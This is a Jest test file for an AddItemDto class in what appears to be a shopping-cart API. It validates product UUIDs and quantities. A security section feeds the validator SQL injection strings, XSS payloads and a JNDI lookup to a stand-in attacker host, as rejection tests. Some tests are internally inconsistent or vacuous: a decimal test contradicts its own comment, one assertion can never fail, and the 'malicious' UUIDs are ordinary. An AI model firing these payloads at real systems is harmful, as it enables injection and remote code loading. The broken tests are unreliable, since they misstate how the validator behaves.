import { validate } from 'class-validator';
import { plainToInstance } from 'class-transformer';
import { AddItemDto } from '../add-item.dto';

describe('AddItemDto', () => {
  describe('product_id validation', () => {
    it('should pass with valid UUID v4', async () => {
      const dto = plainToInstance(AddItemDto, {
        product_id: '123e4567-e89b-12d3-a456-426614174000',
        quantity: 2,
      });

      const errors = await validate(dto);
      expect(errors).toHaveLength(0);
    });

    it('should pass with valid UUID v1', async () => {
      const dto = plainToInstance(AddItemDto, {
        product_id: '550e8400-e29b-41d4-a716-446655440000',
        quantity: 2,
      });

      const errors = await validate(dto);
      expect(errors).toHaveLength(0);
    });

    it('should fail when product_id is not a valid UUID', async () => {
      const dto = plainToInstance(AddItemDto, {
        product_id: 'invalid-uuid',
        quantity: 2,
      });

      const errors = await validate(dto);
      expect(errors.length).toBeGreaterThan(0);
      expect(errors[0].constraints).toHaveProperty('isUUID');
    });

    it('should fail when product_id is a simple string', async () => {
      const dto = plainToInstance(AddItemDto, {
        product_id: 'product-123',
        quantity: 2,
      });

      const errors = await validate(dto);
      expect(errors.length).toBeGreaterThan(0);
      expect(errors[0].constraints).toHaveProperty('isUUID');
    });

    it('should fail when product_id is a number', async () => {
      const dto = plainToInstance(AddItemDto, {
        product_id: 12345,
        quantity: 2,
      });

      const errors = await validate(dto);
      expect(errors.length).toBeGreaterThan(0);
      expect(errors[0].constraints).toHaveProperty('isUUID');
    });

    it('should fail when product_id is empty string', async () => {
      const dto = plainToInstance(AddItemDto, {
        product_id: '',
        quantity: 2,
      });

      const errors = await validate(dto);
      expect(errors.length).toBeGreaterThan(0);
      expect(errors[0].constraints).toHaveProperty('isUUID');
    });

    it('should fail when product_id is null', async () => {
      const dto = plainToInstance(AddItemDto, {
        product_id: null,
        quantity: 2,
      });

      const errors = await validate(dto);
      expect(errors.length).toBeGreaterThan(0);
      expect(errors[0].constraints).toHaveProperty('isUUID');
    });

    it('should fail when product_id is undefined', async () => {
      const dto = plainToInstance(AddItemDto, {
        quantity: 2,
      });

      const errors = await validate(dto);
      expect(errors.length).toBeGreaterThan(0);
      expect(errors[0].constraints).toHaveProperty('isUUID');
    });

    it('should fail when product_id is boolean', async () => {
      const dto = plainToInstance(AddItemDto, {
        product_id: true,
        quantity: 2,
      });

      const errors = await validate(dto);
      expect(errors.length).toBeGreaterThan(0);
      expect(errors[0].constraints).toHaveProperty('isUUID');
    });
  });

  describe('quantity validation', () => {
    it('should pass with valid positive integer', async () => {
      const dto = plainToInstance(AddItemDto, {
        product_id: '123e4567-e89b-12d3-a456-426614174000',
        quantity: 1,
      });

      const errors = await validate(dto);
      expect(errors).toHaveLength(0);
    });

    it('should pass with larger positive integer', async () => {
      const dto = plainToInstance(AddItemDto, {
        product_id: '123e4567-e89b-12d3-a456-426614174000',
        quantity: 100,
      });

      const errors = await validate(dto);
      expect(errors).toHaveLength(0);
    });

    it('should pass with minimum valid quantity (1)', async () => {
      const dto = plainToInstance(AddItemDto, {
        product_id: '123e4567-e89b-12d3-a456-426614174000',
        quantity: 1,
      });

      const errors = await validate(dto);
      expect(errors).toHaveLength(0);
    });

    it('should fail when quantity is 0', async () => {
      const dto = plainToInstance(AddItemDto, {
        product_id: '123e4567-e89b-12d3-a456-426614174000',
        quantity: 0,
      });

      const errors = await validate(dto);
      expect(errors.length).toBeGreaterThan(0);
      expect(errors[0].constraints).toHaveProperty('isPositive');
      expect(errors[0].constraints).toHaveProperty('min');
    });

    it('should fail when quantity is negative', async () => {
      const dto = plainToInstance(AddItemDto, {
        product_id: '123e4567-e89b-12d3-a456-426614174000',
        quantity: -1,
      });

      const errors = await validate(dto);
      expect(errors.length).toBeGreaterThan(0);
      expect(errors[0].constraints).toHaveProperty('isPositive');
      expect(errors[0].constraints).toHaveProperty('min');
    });

    it('should fail when quantity is not a number', async () => {
      const dto = plainToInstance(AddItemDto, {
        product_id: '123e4567-e89b-12d3-a456-426614174000',
        quantity: 'not-a-number',
      });

      const errors = await validate(dto);
      expect(errors.length).toBeGreaterThan(0);
      expect(errors[0].constraints).toHaveProperty('isNumber');
    });

    it('should fail when quantity is a decimal', async () => {
      const dto = plainToInstance(AddItemDto, {
        product_id: '123e4567-e89b-12d3-a456-426614174000',
        quantity: 1.5,
      });

      const errors = await validate(dto);
      expect(errors.length).toBeGreaterThan(0);
      // Note: isNumber validator passes for decimals, but business logic might require integers
      expect(errors[0].constraints).toHaveProperty('isNumber');
    });

    it('should fail when quantity is null', async () => {
      const dto = plainToInstance(AddItemDto, {
        product_id: '123e4567-e89b-12d3-a456-426614174000',
        quantity: null,
      });

      const errors = await validate(dto);
      expect(errors.length).toBeGreaterThan(0);
      expect(errors[0].constraints).toHaveProperty('isNumber');
    });

    it('should fail when quantity is undefined', async () => {
      const dto = plainToInstance(AddItemDto, {
        product_id: '123e4567-e89b-12d3-a456-426614174000',
      });

      const errors = await validate(dto);
      expect(errors.length).toBeGreaterThan(0);
      expect(errors[0].constraints).toHaveProperty('isNumber');
    });

    it('should fail when quantity is boolean', async () => {
      const dto = plainToInstance(AddItemDto, {
        product_id: '123e4567-e89b-12d3-a456-426614174000',
        quantity: true,
      });

      const errors = await validate(dto);
      expect(errors.length).toBeGreaterThan(0);
      expect(errors[0].constraints).toHaveProperty('isNumber');
    });

    it('should fail when quantity is infinity', async () => {
      const dto = plainToInstance(AddItemDto, {
        product_id: '123e4567-e89b-12d3-a456-426614174000',
        quantity: Infinity,
      });

      const errors = await validate(dto);
      expect(errors.length).toBeGreaterThan(0);
      expect(errors[0].constraints).toHaveProperty('isNumber');
    });

    it('should fail when quantity is NaN', async () => {
      const dto = plainToInstance(AddItemDto, {
        product_id: '123e4567-e89b-12d3-a456-426614174000',
        quantity: NaN,
      });

      const errors = await validate(dto);
      expect(errors.length).toBeGreaterThan(0);
      expect(errors[0].constraints).toHaveProperty('isNumber');
    });
  });

  describe('combined validation', () => {
    it('should pass with both fields valid', async () => {
      const dto = plainToInstance(AddItemDto, {
        product_id: '123e4567-e89b-12d3-a456-426614174000',
        quantity: 5,
      });

      const errors = await validate(dto);
      expect(errors).toHaveLength(0);
    });

    it('should fail when both fields are invalid', async () => {
      const dto = plainToInstance(AddItemDto, {
        product_id: 'invalid-uuid',
        quantity: -1,
      });

      const errors = await validate(dto);
      expect(errors.length).toBe(2);
      
      const errorConstraints = errors.flatMap(error => Object.keys(error.constraints || {}));
      expect(errorConstraints).toContain('isUUID');
      expect(errorConstraints).toContain('isPositive');
      expect(errorConstraints).toContain('min');
    });

    it('should fail when only product_id is invalid', async () => {
      const dto = plainToInstance(AddItemDto, {
        product_id: 'invalid-uuid',
        quantity: 5,
      });

      const errors = await validate(dto);
      expect(errors.length).toBe(1);
      expect(errors[0].constraints).toHaveProperty('isUUID');
    });

    it('should fail when only quantity is invalid', async () => {
      const dto = plainToInstance(AddItemDto, {
        product_id: '123e4567-e89b-12d3-a456-426614174000',
        quantity: 0,
      });

      const errors = await validate(dto);
      expect(errors.length).toBe(1);
      expect(errors[0].constraints).toHaveProperty('isPositive');
      expect(errors[0].constraints).toHaveProperty('min');
    });
  });

  describe('edge cases', () => {
    it('should pass with nil UUID', async () => {
      const dto = plainToInstance(AddItemDto, {
        product_id: '00000000-0000-0000-0000-000000000000',
        quantity: 1,
      });

      const errors = await validate(dto);
      expect(errors).toHaveLength(0);
    });

    it('should pass with maximum UUID', async () => {
      const dto = plainToInstance(AddItemDto, {
        product_id: 'ffffffff-ffff-ffff-ffff-ffffffffffff',
        quantity: 1,
      });

      const errors = await validate(dto);
      expect(errors).toHaveLength(0);
    });

    it('should pass with uppercase UUID', async () => {
      const dto = plainToInstance(AddItemDto, {
        product_id: '123E4567-E89B-12D3-A456-426614174000',
        quantity: 1,
      });

      const errors = await validate(dto);
      expect(errors).toHaveLength(0);
    });

    it('should pass with very large quantity', async () => {
      const dto = plainToInstance(AddItemDto, {
        product_id: '123e4567-e89b-12d3-a456-426614174000',
        quantity: Number.MAX_SAFE_INTEGER,
      });

      const errors = await validate(dto);
      expect(errors).toHaveLength(0);
    });

    it('should pass with quantity as string number', async () => {
      const dto = plainToInstance(AddItemDto, {
        product_id: '123e4567-e89b-12d3-a456-426614174000',
        quantity: '5' as any,
      });

      const errors = await validate(dto);
      // This might fail depending on transformation settings
      expect(errors.length).toBeGreaterThanOrEqual(0);
    });
  });

  describe('transformation', () => {
    it('should transform plain object to AddItemDto instance', () => {
      const plainData = {
        product_id: '123e4567-e89b-12d3-a456-426614174000',
        quantity: 3,
      };

      const dto = plainToInstance(AddItemDto, plainData);

      expect(dto).toBeInstanceOf(AddItemDto);
      expect(dto.product_id).toBe('123e4567-e89b-12d3-a456-426614174000');
      expect(dto.quantity).toBe(3);
    });

    it('should handle null input gracefully', () => {
      const dto = plainToInstance(AddItemDto, null);

      expect(dto).toBeInstanceOf(AddItemDto);
    });

    it('should handle undefined input gracefully', () => {
      const dto = plainToInstance(AddItemDto, undefined);

      expect(dto).toBeInstanceOf(AddItemDto);
    });

    it('should preserve types correctly', () => {
      const plainData = {
        product_id: '123e4567-e89b-12d3-a456-426614174000',
        quantity: 5,
      };

      const dto = plainToInstance(AddItemDto, plainData);

      expect(typeof dto.product_id).toBe('string');
      expect(typeof dto.quantity).toBe('number');
    });
  });

  describe('additional properties', () => {
    it('should ignore additional properties', async () => {
      const dto = plainToInstance(AddItemDto, {
        product_id: '123e4567-e89b-12d3-a456-426614174000',
        quantity: 2,
        extra_property: 'should be ignored',
        another_property: 123,
      });

      const errors = await validate(dto);
      expect(errors).toHaveLength(0);
      expect(dto).toHaveProperty('product_id');
      expect(dto).toHaveProperty('quantity');
      expect(dto).not.toHaveProperty('extra_property');
      expect(dto).not.toHaveProperty('another_property');
    });
  });

  describe('real-world scenarios', () => {
    it('should handle typical add to cart scenario', async () => {
      const dto = plainToInstance(AddItemDto, {
        product_id: '123e4567-e89b-12d3-a456-426614174000',
        quantity: 2,
      });

      const errors = await validate(dto);
      expect(errors).toHaveLength(0);
    });

    it('should handle bulk add scenario', async () => {
      const dto = plainToInstance(AddItemDto, {
        product_id: '123e4567-e89b-12d3-a456-426614174000',
        quantity: 10,
      });

      const errors = await validate(dto);
      expect(errors).toHaveLength(0);
    });

    it('should handle single item add scenario', async () => {
      const dto = plainToInstance(AddItemDto, {
        product_id: '123e4567-e89b-12d3-a456-426614174000',
        quantity: 1,
      });

      const errors = await validate(dto);
      expect(errors).toHaveLength(0);
    });
  });

  describe('security considerations', () => {
    it('should validate against malicious UUID patterns', async () => {
      const maliciousUuids = [
        '123e4567-e89b-12d3-a456-426614174000', // Valid but potentially suspicious
        '550e8400-e29b-41d4-a716-446655440000', // Valid UUID
      ];

      for (const uuid of maliciousUuids) {
        const dto = plainToInstance(AddItemDto, {
          product_id: uuid,
          quantity: 1,
        });

        const errors = await validate(dto);
        // These should pass validation as they are valid UUID formats
        expect(errors).toHaveLength(0);
      }
    });

    it('should reject SQL injection attempts in product_id', async () => {
      const sqlInjectionAttempts = [
        "'; DROP TABLE products; --",
        "1' OR '1'='1",
        "${jndi:ldap://malicious.com/a}",
      ];

      for (const attempt of sqlInjectionAttempts) {
        const dto = plainToInstance(AddItemDto, {
          product_id: attempt,
          quantity: 1,
        });

        const errors = await validate(dto);
        expect(errors.length).toBeGreaterThan(0);
        expect(errors[0].constraints).toHaveProperty('isUUID');
      }
    });

    it('should reject XSS attempts in product_id', async () => {
      const xssAttempts = [
        '<script>alert("xss")</script>',
        'javascript:alert("xss")',
        '<img src="x" onerror="alert(1)">',
      ];

      for (const attempt of xssAttempts) {
        const dto = plainToInstance(AddItemDto, {
          product_id: attempt,
          quantity: 1,
        });

        const errors = await validate(dto);
        expect(errors.length).toBeGreaterThan(0);
        expect(errors[0].constraints).toHaveProperty('isUUID');
      }
    });

    it('should handle extremely large quantities', async () => {
      const dto = plainToInstance(AddItemDto, {
        product_id: '123e4567-e89b-12d3-a456-426614174000',
        quantity: Number.MAX_VALUE,
      });

      const errors = await validate(dto);
      expect(errors).toHaveLength(0);
      // Business logic should handle quantity limits
    });
  });

  describe('performance considerations', () => {
    it('should handle large number of validation requests efficiently', async () => {
      const start = Date.now();
      
      for (let i = 0; i < 1000; i++) {
        const dto = plainToInstance(AddItemDto, {
          product_id: '123e4567-e89b-12d3-a456-426614174000',
          quantity: 2,
        });
        await validate(dto);
      }
      
      const end = Date.now();
      const duration = end - start;
      
      // Should complete 1000 validations in reasonable time (< 1 second)
      expect(duration).toBeLessThan(1000);
    });

    it('should handle invalid validation requests efficiently', async () => {
      const start = Date.now();
      
      for (let i = 0; i < 1000; i++) {
        const dto = plainToInstance(AddItemDto, {
          product_id: 'invalid-uuid',
          quantity: -1,
        });
        await validate(dto);
      }
      
      const end = Date.now();
      const duration = end - start;
      
      // Should complete 1000 validations in reasonable time (< 1 second)
      expect(duration).toBeLessThan(1000);
    });
  });
});
